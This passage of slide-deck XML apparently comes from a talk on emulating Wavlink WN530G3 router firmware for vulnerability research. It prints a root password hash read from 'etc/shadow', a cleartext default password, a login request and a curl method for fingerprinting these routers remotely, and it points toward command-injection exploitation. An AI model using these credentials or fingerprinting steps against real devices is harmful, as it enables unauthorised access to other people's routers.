                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Firmware is unencrypted, simple unpacking process</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanis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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716740" y="4675975"/>
            <a:ext cx="22947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None/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Google Shape;227;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="185000" y="166700"/>
            <a:ext cx="8294700" cy="6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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Creds?? How does the router operate??</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p28"/>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
        <p:nvSpPr>
          <p:cNvPr id="229" name="Google Shape;229;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="83350" y="766450"/>
            <a:ext cx="8904600" cy="38322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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>cat etc/shadow</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rootws:$1$N5vjYyES$8ftN1IOibtd2eBuH2UljL/:18841:0:99999:7:::</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cat etc/inittab </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::sysinit:/etc/init.d/rcS S boot</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::shutdown:/etc/init.d/rcS K shutdown</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::askconsole:/usr/libexec/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500" u="sng">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>login.sh</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ls -la /etc/init.d/rcS</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ls: cannot access '/etc/init.d/rcS': No such file or directory</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cat etc/init.d/boot</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echo "0 23 * * * killall -9 lighttpd" &gt;&gt; /etc/crontabs/rootws</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echo "1 23 * * * /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf" &gt;&gt; /etc/crontabs/rootws</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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="174850" y="166700"/>
            <a:ext cx="8802900" cy="58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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>What else does the router need to actually start properly?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="154500" y="664800"/>
            <a:ext cx="8711400" cy="39441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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>ls etc/inid.d/*</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boot  cron  dnsmasq  done  firewall  fstab  gpio_switch  init_pctl  led  led_button_init  lighttpd  log  miniupnpd  modedetect  network  networkdetect  odhcpd  relayd  rpcd  sysctl  sysfixtime  sysntpd  system  umount  urandom_seed  wan_speed  wdsdetect</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EMUX config.txt</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WN530G3 Wavlink Router</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Contributed by ice-wzl</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id=WN530G3</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rootfs=squashfs-root</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randomize_va_space=0</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initcommands="/etc/init.d/boot start; /etc/init.d/firewall start; /etc/init.d/led start; /etc/init.d/miniupnpd start; /etc/init.d/odhcpd start; /etc/init.d/sysfixtime start; /etc/init.d/urandom_seed start; /etc/init.d/cron start; /etc/init.d/fstab start; /etc/init.d/led_button_init start; /etc/init.d/modedetect start; /etc/init.d/relayd start; /etc/init.d/sysntpd start; /etc/init.d/wan_speed start; /etc/init.d/dnsmasq start; /etc/init.d/gpio_switch start; /etc/init.d/lighttpd start; /etc/init.d/network start; /etc/init.d/rpcd start; /etc/init.d/system start; /etc/init.d/wdsdetect start; /etc/init.d/done start; /etc/init.d/init_pctl start; /etc/init.d/log start; /etc/init.d/networkdetect start; /etc/init.d/sysctl start; /etc/init.d/umount start; /sbin/init"</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="236" name="Google Shape;236;p29"/>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0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8205900" cy="4848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sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Other Interesting Rehosting Steps</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="234625" y="728600"/>
            <a:ext cx="8416200" cy="3923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sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>https://github.com/ice-wzl/Wavlink-WN530G3A-Cmd-Injection/blob/main/emux/WN530G3.tar</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Set </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1 wavlogin.link</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in your /etc/hosts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Create </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/var/run/lighttpd.pid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> file</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Remove file </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/etc/lighttpd/conf.d/10-redirect.conf</a:t>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" i="1"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Comment out the below two lines</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="243" name="Google Shape;243;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="238200" y="3367763"/>
            <a:ext cx="8186700" cy="11484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oboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>$SERVER["socket"] == ":443" {</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ssl.engine              = "enable"</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ssl.pemfile             = "/etc/lighttpd/ssl/Meshlink.pem"</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server.document-root    = "/etc/lighttpd/www"</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a:t>
            </a:r>
            <a:endParaRPr sz="6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200">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;p30"/>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8" name="Shape 248"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="205325" y="166700"/>
            <a:ext cx="8691000" cy="5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Webroot??</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="164675" y="664800"/>
            <a:ext cx="8619900" cy="39231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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>cat etc/lighttpd/www/803F5D.txt </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live_setting.shtml</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/cgi-bin/applogin.cgi?api=app&amp;password=</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main1.shtml</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VER=2</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home=main.shtml?app=1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wizard=wizard.shtml?app=1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wifi=wifi.shtml?app=1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led=ledonoff_mesh.shtml?app=1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status=devicestat.shtml?app=1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setup=setting.shtml?app=1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init=sysinit.shtml?app=1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logout=/cgi-bin/applogin.cgi?api=logout</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cat etc/lighttpd/www/api.txt   </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"API_Ver": "1",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"API ": "ap.setup/cgi-bin/api.cgi",</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"https": "1" </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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="251" name="Google Shape;251;p31"/>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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8372700" cy="4980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100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Where is the config?</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="154500" y="664800"/>
            <a:ext cx="8711400" cy="18114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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>cat /etc/config/winstar</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--snip--</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option SYS_DOMAIN1 'wavlogin.link'</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option SYS_DOMAIN2 'wifi.wavlink.com'</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option lan_ipaddr '192.168.10.1'</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option Brand 'WAVLINK'</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option ENWISP '0'</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option Platform 'SF19A28'</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1100">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>    option Password 'adminadmin'</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a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="258" name="Google Shape;258;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="191425" y="2556325"/>
            <a:ext cx="8711400" cy="20325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No need to crack hashes when they are in the clear</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">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All routers settings stored in the winstar file</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="259" name="Google Shape;259;p32"/>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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="175950"/>
            <a:ext cx="8572200" cy="4980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100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Once all the pieces are in place</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="265" name="Google Shape;265;p33" title="emux-running-router.mp4">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="617900"/>
            <a:ext cx="8647277" cy="4058076"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p33"/>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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="205325" y="156550"/>
            <a:ext cx="8619900" cy="5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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Can we fingerprint the router?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="272" name="Google Shape;272;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="246000" y="857925"/>
            <a:ext cx="8589300" cy="23076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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>curl -X GET -A "" http://127.0.0.1/ &gt; /tmp/root.out; egrep "Model=|ModelType=|SYS_DOMAIN1|Lang=|localIP=|wanGateway=" /tmp/root.out</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var Model="WN530G3";</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var ModelType="GW";</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var SYS_DOMAIN1="wavlogin.link";</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var Lang="en";</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var tmpLang="";</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var localIP="::ffff:192.168.100.1";</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="296825" y="3338200"/>
            <a:ext cx="8528400" cy="1179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Trivial to fingerprint Wavlink remotely</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">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Automate discovery, and exploitation</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="274" name="Google Shape;274;p34"/>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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8687100" cy="510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sz="3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>One way to hash a password…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="259325" y="759475"/>
            <a:ext cx="8595300" cy="21858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Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>POST /cgi-bin/login.cgi HTTP/1.1</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--snip--</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newUI=1&amp;page=login&amp;username=admin&amp;langChange=0&amp;ipaddr=%3A%3Affff%3A192.168.100.10&amp;login_page=login.shtml&amp;homepage=main.shtml&amp;sysinitpage=sysinit.shtml&amp;wizardpage=wizard.shtml&amp;hostname=localhost&amp;key=M37557355&amp;password=9b8f742697cf4656f70f6ec00e1b4947&amp;lang_select=en</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="281" name="Google Shape;281;p35"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="259325" y="3029750"/>
            <a:ext cx="3676650" cy="304800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="282" name="Google Shape;282;p35"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4009593" y="3029750"/>
            <a:ext cx="4845031" cy="1301525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p35"/>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6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="489950" y="44725"/>
            <a:ext cx="8132100" cy="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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Overview Page</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="289" name="Google Shape;289;p36"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="584650" y="431137"/>
            <a:ext cx="3073825" cy="4196524"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="290" name="Google Shape;290;p36"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4780275" y="431125"/>
            <a:ext cx="3091927" cy="4196524"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;p36"/>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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="327325" y="146375"/>
            <a:ext cx="8436900" cy="5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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Excitement Intensifies…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p37"/>
